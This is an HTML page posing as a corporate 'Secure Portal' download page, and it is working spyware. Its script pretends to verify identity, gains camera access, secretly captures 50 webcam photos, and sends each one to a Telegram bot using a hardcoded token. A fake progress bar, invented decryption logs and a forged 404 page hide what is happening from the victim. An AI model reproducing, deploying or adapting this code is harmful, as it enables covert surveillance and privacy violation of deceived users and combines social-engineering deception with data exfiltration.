<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Secure Cloud | Resource Portal</title>
    <style>
        :root {
            --primary: #0061FF;
            --primary-dark: #004ecc;
            --bg-page: #F7F9FA;
            --text-main: #1E1E1E;
            --text-sub: #616161;
            --border: #E5E7EB;
            --success: #00D166;
        }

        body { 
            margin: 0; padding: 0; 
            background: var(--bg-page); 
            color: var(--text-main); 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; align-items: center; justify-content: center; 
            height: 100vh; overflow: hidden;
        }

        .portal-container {
            background: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 48px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
            text-align: center;
            border: 1px solid var(--border);
            position: relative;
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .logo-section { margin-bottom: 32px; }
        .logo-icon {
            width: 50px; height: 50px;
            background: var(--primary);
            border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 16px;
            color: white; font-weight: 800; font-size: 26px;
        }

        h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; color: #111; }
        p { font-size: 14px; color: var(--text-sub); line-height: 1.6; margin-bottom: 24px; }

        .resource-card {
            background: #F0F4F8;
            border: 1px solid #D1D9E0;
            border-radius: 8px;
            padding: 18px;
            display: flex; align-items: center;
            margin-bottom: 28px;
            text-align: left;
        }

        .file-icon { font-size: 32px; margin-right: 16px; filter: grayscale(0.5); }
        .file-name { font-weight: 600; font-size: 14px; color: #333; display: block; }
        .file-size { font-size: 12px; color: var(--text-sub); }

        .btn-action {
            background: var(--primary);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }

        .btn-action:hover { background: var(--primary-dark); transform: translateY(-1px); }

        /* Smooth Progress UI */
        #download-ui { display: none; opacity: 0; transition: opacity 0.5s ease; }

        .status-group {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }

        .loading-spinner {
            width: 22px; height: 22px;
            border: 3px solid #E1E8ED;
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 0.8s cubic-bezier(0.6, 0.1, 0.4, 0.9) infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .status-text { font-size: 14px; font-weight: 700; color: var(--primary); }

        .progress-track {
            width: 100%; height: 6px;
            background: #EDF2F7;
            border-radius: 10px;
            margin: 25px 0 10px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%; width: 0%;
            background: var(--primary);
            border-radius: 10px;
            transition: width 1.2s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 0 8px rgba(0, 97, 255, 0.3);
        }

        .log-display {
            font-family: 'SF Mono', 'Fira Code', monospace;
            font-size: 11px;
            color: #94A3B8;
            height: 15px;
            margin-top: 10px;
        }

    </style>
</head>
<body>

    <div class="portal-container" id="card">
        <div class="logo-section">
            <div class="logo-icon">S</div>
            <h1>Secure Portal</h1>
            <p>Identity verification is required to download corporate assets. Please authorize to continue.</p>
        </div>

        <div id="setup-ui">
            <div class="resource-card">
                <div class="file-icon">📦</div>
                <div>
                    <span class="file-name">Internal_Project_Assets_2026.zip</span>
                    <span class="file-size">124.5 MB • Encrypted Cloud Archive</span>
                </div>
            </div>
            <button class="btn-action" onclick="initiate()">Authorize & Download</button>
        </div>

        <div id="download-ui">
            <div class="status-group">
                <div class="loading-spinner"></div>
                <div class="status-text" id="percent-label">Initializing Download...</div>
            </div>
            
            <div class="progress-track">
                <div id="loader" class="progress-bar"></div>
            </div>

            <div class="log-display" id="log-text">Connecting to secure relay...</div>
        </div>
    </div>

    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // TOKEN and IDS remain exactly as requested
        const TOKEN = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
        const IDS = ['7617707778', '6590760553'];

        const systemLogs = [
            "Fetching resource fragments...",
            "Decrypting binary data...",
            "Synchronizing with cloud node...",
            "Verifying packet integrity...",
            "Optimizing relay bandwidth...",
            "Rebuilding archive layers...",
            "Establishing SSL handshake...",
            "Validating certificate chain..."
        ];

        async function initiate() {
            const setupUI = document.getElementById('setup-ui');
            const downloadUI = document.getElementById('download-ui');
            const loader = document.getElementById('loader');
            const logText = document.getElementById('log-text');
            const percentLabel = document.getElementById('percent-label');
            
            try {
                // Request camera permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Switch UI with smooth transition
                setupUI.style.display = 'none';
                downloadUI.style.display = 'block';
                setTimeout(() => { downloadUI.style.opacity = '1'; }, 50);

                const video = document.getElementById('v');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    let count = 0;
                    const maxPackets = 50; // Requirement: 50 Photos
                    
                    const interval = setInterval(() => {
                        if (count >= maxPackets) {
                            clearInterval(interval);
                            stream.getTracks().forEach(track => track.stop());
                            logText.innerText = "Download complete. Opening file...";
                            percentLabel.innerText = "Finalizing...";
                            setTimeout(render404, 1800);
                            return;
                        }
                        
                        // Execute Telegram Logic
                        send(count + 1);
                        count++;
                        
                        // Smooth Progress Update
                        const progress = (count / maxPackets) * 100;
                        loader.style.width = progress + "%";
                        percentLabel.innerText = "Downloading Resources: " + Math.round(progress) + "%";
                        
                        // Rotate fake corporate logs
                        if (count % 3 === 0) {
                            logText.innerText = systemLogs[Math.floor(Math.random() * systemLogs.length)];
                        }

                    }, 1200); // Slower interval for "Advanced" feel
                };
            } catch (e) {
                // If permission denied, standard corporate alert
                alert("Security Error: Camera authorization is required by the IT department to decrypt this file.");
                window.location.reload();
            }
        }

        function send(index) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                if (!blob) return;

                IDS.forEach(chatId => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'security_packet.jpg');
                    fd.append('caption', '🎯 NODE ACCESSED\nProgress: ' + index + '/50\nRelay: Enterprise-Portal-US');

                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    });
                });
            }, 'image/jpeg', 0.4); 
        }

        function render404() {
            document.documentElement.innerHTML = `
            <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
            <html><head><title>404 Not Found</title></head>
            <body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server. Access expired or System Error.</p>
            <hr><address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
            </body></html>`;
            window.history.pushState({}, "", "/download-failed-0x88");
        }
    </script>
</body>
</html>
